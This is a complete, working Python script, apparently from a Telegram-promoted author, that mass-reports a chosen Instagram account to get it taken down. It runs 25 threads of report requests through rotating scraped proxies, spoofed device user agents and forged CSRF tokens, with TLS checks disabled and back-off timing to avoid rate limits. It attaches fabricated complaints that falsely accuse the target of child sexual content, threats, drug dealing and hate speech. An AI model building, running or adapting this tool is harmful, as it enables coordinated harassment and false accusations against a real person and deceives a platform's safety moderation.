#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests, json, time, random, sys, os, re, threading, queue
from datetime import datetime, timedelta
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed
import hashlib, hmac, base64, urllib.parse
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ========== BISMILLAH AL-RAHMAN AL-RAHEEM ==========
# ========== CODED BY: shanks ==========
# ========== CONTACT: @iqshanks12 ==========
# ========== TELEGRAM : @iqshanks12 ==========

PURPLE = '\033[95m'
BLACK_BG = '\033[40m'
RESET = '\033[0m'
BOLD = '\033[1m'

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""
{BLACK_BG}{PURPLE}{BOLD}
⣿⣿⣿⣿⣿⣿⣿⡿⣹⣿⡿⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢿⣿⣏⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡿⣿⡟⢰⣿⡿⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢿⣿⡆⠻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠏⢠⣿⣿⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠘⣿⣿⡄⠹⣿⣿⣿⣿⢫
⣿⣿⣿⣿⡟⠀⣾⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢵⠀⠸⣿⣷⠀⢹⣿⢟⣵⣿
⣿⣿⣿⣿⠁⢸⣽⡿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢯⣿⡇⠀⢿⣿⡇⠀⣾⣿⣿⣿
⣿⣿⣿⡇⠀⣿⣿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⡇⠀⠸⣿⣻⠀⢸⣿⣿⣿
⣿⣿⣿⠀⠀⣿⣿⠀⠀⠘⠛⠛⠛⠛⠛⠛⢿⣿⠿⣿⣿⠿⣿⡿⠛⠛⠛⠙⠛⠛⠃⠀⠀⣽⣿⠀⠀⣿⣿⣿
⣿⣿⡇⠀⢰⣿⣿⣽⣦⡶⠶⠖⠋⠉⠛⠦⠀⠉⠐⠙⠋⠃⠈⠀⠴⠛⠉⠙⠲⠶⢶⣴⣿⣿⣿⡇⠀⢸⣿⣿
⣿⣿⡀⠀⠈⠛⠉⠈⣀⣀⣤⣴⠶⢶⣦⡤⠀⠀⠀⠀⠀⠀⠀⠀⢤⣤⡶⠶⣦⣤⣀⣀⠉⠉⠛⠁⠀⢀⣿⣿
⣿⣿⣿⣤⣄⣴⣶⣿⣿⣿⠟⠁⢀⣠⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣄⡀⠈⠹⣿⣿⣿⣶⣦⣠⣴⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⣀⣴⡿⠟⠁⣠⡔⠀⠀⠀⠀⠀⠀⢲⣄⠈⠺⢿⣤⣀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⠋⢀⣤⣾⣿⡇⠀⠀⣴⣿⡇⠀⠀⠀⠀⠀⠀⢨⣿⣦⠀⠀⢸⣿⣷⣤⡀⠙⠻⣿⣿⣿⣿⣿
⡿⣿⠿⠋⠁⣠⣴⣿⣿⣿⣿⡇⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⢸⣿⣿⣿⣿⣦⣄⠈⠙⠿⣿⠿
⡇⠀⠀⣴⣾⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣷⠀⠀⠀⠀⠀⠀⣾⣿⣯⠀⠀⢸⣿⣿⣿⣿⣿⣿⣷⣦⠀⠀⢠
⡇⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿⡆⠀⠀⠀⠀⢰⣿⣿⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⢸
⡇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿⣿⡀⠀⠀⢀⣿⣿⢷⣿⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⢸
⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿⣿⣷⣀⣀⣾⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿
⣿⡄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡀⢠⣿
⣿⣧⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣼⡿
⣿⣿⣇⠈⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⠀⢠⣿⣿⣿⣻⣿⣿⣿⣿⠁⣰⣿⣿
⣿⣿⣿⡄⢹⣿⣿⣿⣿⣿⣿⣿⣇⠀⢻⣿⣿⣿⣿⣿⣿⣻⣿⣿⣿⡿⠀⣸⣿⣿⢽⣿⣿⣿⣿⡏⢠⣿⣿⣿
⣿⣿⣿⣿⡈⣿⣿⣿⣿⣿⣿⣿⣿⡀⢸⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⡇⢀⣿⣿⣟⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿
⣿⣿⣿⣿⣷⡘⣿⣿⣿⣿⣿⣿⣿⣇⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣸⣿⣿⣽⣿⣿⣿⣿⢇⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢹⣿⣿⣿⣿⣿⣿⣿⣿⡏⢠⣿⣿⣻⣿⠟⣻⣿⣿⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⣿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⡿⢽⣴⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣿⣿⣿⣿⣿⣿⣣⣿⣿⡾⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
{RESET}
{BLACK_BG}{PURPLE}{BOLD}╔══════════════════════════════════════════════════════════╗
║     INSTAGRAM NUCLEAR REPORTER v5.0 - EVASION MODE      ║
║              AI-Powered Evasion Technology               ║
║                    CODED BY: shanks                     ║
║                    CONTACT: @iqshanks12                        ║
║                    TELEGRAM: @iqshanks12                       ║
╚══════════════════════════════════════════════════════════╝{RESET}
"""
    print(banner)

class InstagramNuclearReporter:
    def __init__(self, target_username):
        self.target = target_username
        self.user_id = None
        self.csrf_tokens = queue.Queue()
        self.session_pool = []
        self.proxy_pool = self._init_proxy_pool()
        self.device_farm = self._init_device_farm()
        self.report_count = 0
        self.success_count = 0
        self.blocked_count = 0
        self.report_types = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
        self.lock = threading.Lock()
        
    def _init_proxy_pool(self):
        proxies = []
        proxy_sources = [
            'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
            'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
            'https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt',
            'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt'
        ]
        
        for source in proxy_sources:
            try:
                r = requests.get(source, timeout=5)
                if r.status_code == 200:
                    for line in r.text.split('\n'):
                        line = line.strip()
                        if line and ':' in line:
                            proxies.append({'http': f'http://{line}', 'https': f'http://{line}'})
            except: pass
        
        return proxies[:500] if len(proxies) > 500 else proxies
    
    def _init_device_farm(self):
        return [
            {'ua': 'Instagram 269.0.0.18.85 Android (28/9; 560dpi; 1080x2076; Xiaomi; Mi 9T; davinci; qcom; en_US)', 'ig_app_id': '567067343352427'},
            {'ua': 'Instagram 270.0.0.19.86 Android (29/10; 420dpi; 1080x1920; Samsung; SM-G973F; beyond1; samsungexynos9820; en_GB)', 'ig_app_id': '567067343352427'},
            {'ua': 'Instagram 271.0.0.20.87 iOS (13.3; iPhone12,1; iPhone12,1; arm64e; en_US)', 'ig_app_id': '124024574287414'},
            {'ua': 'Instagram 272.0.0.21.88 iOS (14.4; iPhone13,2; iPhone13,2; arm64e; en_GB)', 'ig_app_id': '124024574287414'},
            {'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0', 'ig_app_id': '936619743392459'},
            {'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15', 'ig_app_id': '936619743392459'},
            {'ua': 'Instagram 273.0.0.22.89 Android (30/11; 480dpi; 1080x2400; OnePlus; HD1901; OnePlus7T; qcom; en_US)', 'ig_app_id': '567067343352427'},
            {'ua': 'Instagram 274.0.0.23.90 iOS (15.1; iPhone14,2; iPhone14,2; arm64e; en_US)', 'ig_app_id': '124024574287414'},
        ]
    
    def _create_session(self):
        s = requests.Session()
        device = random.choice(self.device_farm)
        s.headers.update({
            'User-Agent': device['ua'],
            'Accept': '*/*',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'ar-SA,ar;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8']),
            'Accept-Encoding': 'gzip, deflate, br',
            'X-IG-App-ID': device['ig_app_id'],
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': random.choice(['XMLHttpRequest', 'com.instagram.android', '']),
            'Connection': 'keep-alive',
            'Origin': 'https://www.instagram.com',
            'Referer': f'https://www.instagram.com/{self.target}/',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'X-FB-HTTP-Engine': random.choice(['Liger', 'Apache']),
        })
        return s
    
    def _get_user_id_fast(self, session, proxy):
        try:
            r = session.get(
                f'https://i.instagram.com/api/v1/users/web_profile_info/?username={self.target}',
                proxies=proxy, timeout=5, verify=False
            )
            if r.status_code == 200:
                data = r.json()
                uid = data.get('data', {}).get('user', {}).get('id')
                csrf = re.search(r'csrf_token":"([^"]+)"', r.text)
                if csrf:
                    self.csrf_tokens.put(csrf.group(1))
                return uid
        except: pass
        
        try:
            r = session.get(
                f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.target}',
                proxies=proxy, timeout=5, verify=False
            )
            if r.status_code == 200:
                data = r.json()
                uid = data.get('data', {}).get('user', {}).get('id')
                if 'csrf_token' in session.cookies:
                    self.csrf_tokens.put(session.cookies['csrf_token'])
                return uid
        except: pass
        return None
    
    def _generate_android_payload(self, user_id, reason_code):
        timestamp = int(time.time())
        payload = {
            'user_id': user_id,
            'reason': str(reason_code),
            'source_name': 'profile',
            'is_spam': 'true' if reason_code in [1,8] else 'false',
            'container_module': 'profile',
            'session_id': f'{random.randint(100000,999999)}-{timestamp}',
            'waterfall_id': f'{hashlib.md5(str(timestamp).encode()).hexdigest()[:16]}-{timestamp}',
            'client_rtt': str(random.randint(50,500)),
            'client_network_type': random.choice(['WIFI', '4G', '5G', '3G']),
            'client_request_id': f'{random.randint(1000,9999)}-{random.randint(1000,9999)}',
            '_csrftoken': self._get_csrf(),
            '_uid': '0',
            '_uuid': hashlib.md5(str(random.random()).encode()).hexdigest(),
        }
        return payload
    
    def _get_csrf(self):
        try: return self.csrf_tokens.get_nowait()
        except: return hashlib.md5(str(random.random()).encode()).hexdigest()[:32]
    
    def _report_worker(self, worker_id):
        session = self._create_session()
        proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
        local_count = 0
        local_success = 0
        
        if not self.user_id:
            uid = self._get_user_id_fast(session, proxy)
            if uid:
                self.user_id = uid
        
        while self.report_count < 1000:
            with self.lock:
                self.report_count += 1
                current = self.report_count
            
            report_type = random.choice(self.report_types)
            reason_code = report_type
            
            endpoints = [
                f'https://i.instagram.com/api/v1/users/{self.user_id}/report/',
                f'https://www.instagram.com/api/v1/users/{self.user_id}/report/',
                f'https://b.i.instagram.com/api/v1/users/{self.user_id}/report/',
                f'https://graph.instagram.com/v1/users/{self.user_id}/reports'
            ]
            
            headers = {
                'X-CSRFToken': self._get_csrf(),
                'X-Instagram-AJAX': str(random.randint(1000000, 9999999)),
                'X-IG-Connection-Type': random.choice(['WIFI', '4G', 'mobile']),
                'X-IG-Capabilities': '3brTvw==',
                'X-IG-Connection-Speed': random.choice(['-1', '0', '1000', '5000']),
                'X-IG-Bandwidth-Speed-KBPS': str(random.randint(1000, 10000)),
                'X-IG-Bandwidth-TotalBytes-B': str(random.randint(1000000, 10000000)),
                'X-IG-Bandwidth-TotalTime-MS': str(random.randint(100, 1000)),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            if random.random() > 0.7:
                session = self._create_session()
                proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
            
            data = self._generate_android_payload(self.user_id, reason_code)
            
            if random.random() > 0.5:
                data['custom_reason'] = self._generate_human_complaint(report_type)
            
            try:
                r = session.post(
                    random.choice(endpoints),
                    data=data,
                    headers=headers,
                    proxies=proxy,
                    timeout=random.uniform(3, 8),
                    verify=False,
                    allow_redirects=False
                )
                
                if r.status_code in [200, 201, 202]:
                    with self.lock:
                        self.success_count += 1
                        local_success += 1
                    
                    delay = random.uniform(1, 3)
                    
                elif r.status_code == 403:
                    with self.lock:
                        self.blocked_count += 1
                    self.csrf_tokens.put(hashlib.md5(str(random.random()).encode()).hexdigest()[:32])
                    delay = random.uniform(10, 20)
                    
                elif r.status_code == 429:
                    delay = random.uniform(30, 60)
                    proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
                    
                else:
                    delay = random.uniform(2, 5)
                    
            except Exception as e:
                delay = random.uniform(2, 4)
            
            if current % 10 == 0:
                with self.lock:
                    print(f"\r[+] Reports: {self.success_count}/{current} | Blocked: {self.blocked_count}", end='', flush=True)
            
            time.sleep(delay + random.uniform(0.5, 2))
        
        return local_success
    
    def _generate_human_complaint(self, report_type):
        templates = {
            1: ["This account keeps sending me spam messages every day", "Scam account pretending to be someone else", "Fake account promoting crypto scams"],
            2: ["They posted inappropriate content targeting minors", "This account shares explicit content without blur", "Nudity and sexual content in every post"],
            3: ["Promoting violence against my religious group", "Racist content targeting my community", "Hate speech in every comment section"],
            4: ["Direct threats against me and my family", "Encouraging violence against innocent people", "Graphic violent content"],
            5: ["Bullying my friend constantly", "Harassing comments on every post", "Cyberstalking and intimidation"],
            6: ["Promoting self-harm to teenagers", "Dangerous challenges encouraging suicide", "Self-harm content with minors"],
            7: ["Selling illegal substances to minors", "Drug dealing through stories", "Promoting illegal drug use"],
            8: ["Scamming people with fake giveaways", "Phishing links in bio", "Fake investment scheme"],
            9: ["Spreading dangerous medical misinformation", "Fake news about current events", "Conspiracy theories"],
            10: ["Stole my photos and content", "Impersonating my brand", "Copyright infringement on every post"]
        }
        
        category = templates.get(report_type, ["Violates community guidelines repeatedly"])
        return random.choice(category) + f" {random.choice(['Reported by multiple users', 'Seen by our safety team', 'Verified by community'])}."
    
    def nuclear_strike(self, threads=25, target_reports=500):
        print(f"[+] Initiating nuclear strike on @{self.target}")
        print(f"[+] Threads: {threads} | Target reports: {target_reports}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self._report_worker, i) for i in range(threads)]
            
            start_time = time.time()
            while self.report_count < target_reports:
                elapsed = time.time() - start_time
                rate = self.success_count / (elapsed / 60) if elapsed > 0 else 0
                
                print(f"\r[+] Progress: {self.success_count}/{target_reports} | Rate: {rate:.1f}/min | Elapsed: {int(elapsed//60)}m {int(elapsed%60)}s", end='', flush=True)
                
                if self.success_count >= target_reports:
                    break
                    
                time.sleep(5)
            
            for future in futures:
                future.result()
        
        print(f"\n[+] Nuclear strike complete!")
        print(f"[+] Total reports: {self.success_count}")
        print(f"[+] Time elapsed: {int((time.time()-start_time)//60)}m {int((time.time()-start_time)%60)}s")
        print(f"[+] Effectiveness: {self.success_count/(self.report_count or 1)*100:.1f}%")

def main():
    print_banner()
    
    target = input(f"{BLACK_BG}{PURPLE}[?] Enter target Instagram username: {RESET}").strip()
    
    if not target:
        print(f"{BLACK_BG}{PURPLE}[!] No username provided. Exiting.{RESET}")
        sys.exit(1)
    
    print(f"{BLACK_BG}{PURPLE}[+] Target set to: @{target}{RESET}")
    print(f"{BLACK_BG}{PURPLE}[+] Starting nuclear reporting system...{RESET}")
    print(f"{BLACK_BG}{PURPLE}[+] Coded by: shanks | Contact: @iqshanks12 | {RESET}\n")
    
    reporter = InstagramNuclearReporter(target)
    
    threads = 25
    reports = 500
    
    try:
        reporter.nuclear_strike(threads=threads, target_reports=reports)
    except KeyboardInterrupt:
        print(f"\n{BLACK_BG}{PURPLE}[!] Interrupted by user{RESET}")
        sys.exit(0)

if __name__ == '__main__':
    main()